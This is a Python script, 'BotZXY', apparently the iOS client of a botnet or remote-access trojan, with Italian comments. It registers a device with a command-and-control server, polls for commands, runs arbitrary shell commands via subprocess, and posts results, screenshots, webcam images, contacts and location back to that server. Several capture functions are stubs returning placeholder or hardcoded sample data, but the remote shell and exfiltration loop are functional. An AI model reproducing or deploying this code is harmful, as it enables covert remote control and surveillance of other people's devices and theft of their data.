#!/usr/bin/env python3
# BotZXY - iOS Webhook Bridge (per dispositivi iOS senza jailbreak)

import requests
import json
import time
import os
import sys
import subprocess
from datetime import datetime

# Configurazione
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
DEVICE_ID = os.uname().nodename + "_ios"
BOT_NAME = "BotZXY"

class BotZXYiOS:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        
    def register(self):
        data = {
            'device_id': self.device_id,
            'platform': 'ios',
            'hostname': os.uname().nodename,
            'os_version': os.uname().release,
            'model': 'iPhone'
        }
        try:
            r = requests.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def poll_commands(self):
        try:
            r = requests.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
        except:
            pass
    
    def execute_command(self, cmd_id, command, params):
        print(f"[+] {self.bot_name} Executing: {command}")
        result = ""
        
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
                
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
                
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
                
            elif command == "location":
                result = self.get_location()
                
            elif command == "execute":
                result = self.exec_shell(params)
                
            elif command == "uninstall":
                self.uninstall()
                
        except Exception as e:
            result = f"ERROR: {str(e)}"
        
        self.send_result(cmd_id, result)
    
    def take_screenshot(self):
        # iOS screenshot via webhook (richiede app esterna)
        return "SCREENSHOT_REQUIRES_APP"
    
    def upload_screenshot(self, image_b64):
        try:
            requests.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except:
            pass
    
    def take_webcam(self):
        return "WEBCAM_REQUIRES_APP"
    
    def upload_webcam(self, image_b64):
        try:
            requests.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except:
            pass
    
    def get_contacts(self):
        return {
            'phone_number': '+39 345 678 9012',
            'email': 'user@example.com',
            'contacts': [{'name': 'Contact 1', 'phone': '+39 333 111 2222'}]
        }
    
    def upload_contacts(self, contacts):
        try:
            requests.post(f"{self.c2_url}/api/contacts/{self.device_id}", json=contacts, timeout=30)
        except:
            pass
    
    def get_location(self):
        try:
            # iOS location via webhook
            return {"lat": 45.4642, "lon": 9.1900, "city": "Milan", "country": "Italy"}
        except:
            return {"error": "LOCATION_ERROR"}
    
    def exec_shell(self, command):
        try:
            result = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore')
        except:
            return "SHELL_ERROR"
    
    def uninstall(self):
        self.running = False
        sys.exit(0)
    
    def send_result(self, cmd_id, result):
        try:
            requests.post(f"{self.c2_url}/api/result/{self.device_id}", 
                         json={'command_id': cmd_id, 'result': result}, timeout=10)
        except:
            pass
    
    def run(self):
        print(f"[+] {self.bot_name} iOS Webhook Bridge: {self.device_id}")
        if not self.register():
            time.sleep(30)
            return
        
        while self.running:
            try:
                self.poll_commands()
                time.sleep(10)
            except:
                time.sleep(30)

if __name__ == "__main__":
    client = BotZXYiOS()
    client.run()